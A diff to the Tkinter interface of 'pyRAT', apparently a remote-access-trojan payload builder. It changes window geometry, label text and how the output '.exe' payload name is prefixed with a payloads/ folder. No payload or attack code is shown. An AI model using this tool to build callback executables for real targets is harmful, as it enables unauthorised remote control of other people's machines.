@@ -79,21 +79,21 @@ def mal(var):
     top=Toplevel()
     top.title('pyRAT')
     top.resizable(width=False, height=False)
-    top.geometry("+480+260")
-    Label(top, text='Please, insert your local IP address:').pack()
-    ip = Entry(top,width=30, bg="lightblue")
+    top.geometry("+820+395")
+    Label(top, text='Local IP Address:').pack()
+    ip = Entry(top,width=22, bg="lightblue")
     ip.pack()
-    Label(top, text='Please, insert your local port:').pack()
-    porta = Entry(top,width=30, bg="lightblue")
+    Label(top, text='Local Port:').pack()
+    porta = Entry(top,width=22, bg="lightblue")
     porta.pack()
    
-    Label(top, text='Please, insert other options if required:').pack()
-    extra = Entry(top,width=30, bg="lightblue")
+    Label(top, text='Other options if required:').pack()
+    extra = Entry(top,width=22, bg="lightblue")
     extra.pack()
     
-    v = StringVar(top, value='payloads/')
-    Label(top, text="Please, insert the file's name: ").pack()
-    out = Entry(top,textvariable=v, width=30, bg="lightblue")
+   # v = StringVar(top, value='payloads/')
+    Label(top, text="Payload's name: ").pack()
+    out = Entry(top, width=22, bg="lightblue")
     out.pack()
     information = Button(top, text="i", bg='lightblue', state=ACTIVE, command=lambda: [info()])
     information.pack(side=RIGHT)
@@ -168,9 +168,10 @@ def generation():
     global scan, file_name, options, name, legit_file
     opt = extra.get()
     options = "'" + opt + "'"
-    name = out.get()
-    file_name = name + ".exe"
-
+    onoma = out.get()
+    name =  "payloads/" + onoma
+    file_name =  name + ".exe"
+    
 ############################################################################################################
 # User has to know in advance the required options in order for the payload to be executed successfully :) #
 ############################################################################################################
@@ -256,7 +257,7 @@ if __name__ == "__main__":
   
 	root=Tk()
 	root.title("pyRAT")
-	root.geometry("560x560+320+120")
+	root.geometry("560x560+630+260")
         root.resizable(width=False, height=False)
         root.configure(bg='lightblue')
         var = StringVar()
